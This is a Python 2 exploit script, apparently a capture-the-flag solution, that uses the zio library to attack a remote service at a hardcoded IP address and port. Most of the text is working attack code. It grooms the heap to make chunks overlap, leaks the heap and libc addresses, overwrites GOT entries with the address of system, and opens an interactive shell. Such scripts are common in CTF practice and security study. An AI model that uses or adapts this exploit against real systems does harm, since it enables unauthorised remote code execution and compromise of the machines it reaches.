from zio import *
io = zio(('119.28.62.216', 10024), print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 100000)
io.hint([0x400e16])

adr_control = 0x6030b8

io.wl_af('?', 'y')
io.wls_af(':', [1, '/bin/sh', 'BBBB'])
io.wl_af(':', 2)

io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
io.wls_af(':', [2, 0x1f0, 'aaaa'])
io.wls_af(':', [2, 0x1f0, 'aaaa'])
io.wls_af(':', [2, 0x1f0, 'dddd'])
io.wls_af(':', [3, 2])
io.wls_af(':', [3, 1])
io.wls_af(':', [2, 0x1f0, 'b' * 0x1f0])     # shrink free chunk
io.wl_af(':', 5)

io.wl_af(':', 2)
io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
io.wl_af(':', 5)

io.wl_af(':', 2)
io.wls_af(':', [1, 'AAAA', 'BBBB', 'CCCC', 'DDDD'])
io.wl_af(':', 5)

# overlap
io.wls_af(':', [4, 2])
io.wls_af(':', [4, 1])
io.wl_af(':', 2)
io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
io.wls_af(':', [3, 1])
io.wls_af(':', [2, 0x1f0, 'b' * 0x98 + l64(0x0) + l64(0x81) + l64(adr_control - 0x20)])
io.wl_af(':', 5)

io.wl_af(':', 5)
io.rtl('======receiver[2]=======')
io.rtl('postcodes:')
heap_base = l64(io.rl()[0:-1].ljust(0x8, '\x00')) - 0x10
print '[+] heap base\t:0x%x' % heap_base

io.wl_af(':', 2)
io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
io.wls_af(':', [3, 0])
io.wls_af(':', [2, 0x1f0, 'd' * 0x98 + l64(0x0) + l64(0x81) + l64(0x603000 - 0x18)])
io.wl_af(':', 5)

io.wl_af(':', 5)
io.rtl('======receiver[3]=======')
io.rtl('contact:')
adr_free    = l64(io.r(6).ljust(0x8, '\x00'))
off_free    = 0x0000000000083c30
off_read    = 0x00000000000ec690
off_puts    = 0x0000000000070c70
off_malloc  = 0x0000000000083590
libc_base   = adr_free - off_free
off_system  = 0x00000000000468f0
adr_system  = off_system + libc_base
adr_puts    = off_puts + libc_base
adr_read    = off_read + libc_base
adr_malloc  = off_malloc + libc_base

print '[+] free address\t:0x%x' % adr_free
print '[+] system address\t:0x%x' % adr_system

io.wl_af(':', 2)
io.wls_af(':', [1, 'AAAA', 'AAAA', 'AAAA', 'AAAA'])
io.wls_af(':', [3, 0])
io.wls_af(':', [2, 0x1f0, 'd' * 0x98 + l64(0x0) + l64(0x81) + l64(heap_base)])
io.wl_af(':', 5)

io.wls_af(':', [3, 4]),
io.w(l64(0x603008) + l64(heap_base + 0x40)[0:7] + '\n' + 'B' * 0x8 + 'C' * 0x38)

io.wls_af(':', [3, 0])
io.w(l64(adr_system)[0:7] + '\n' + l64(adr_puts)[0:7] + '\n' + l64(adr_read)[0:7] + '\n' + l64(adr_malloc) + 'D' * 0x20 + l64(adr_system)[0:7] + '\n')
io.wl('sh')
io.wl('6')

io.itr()
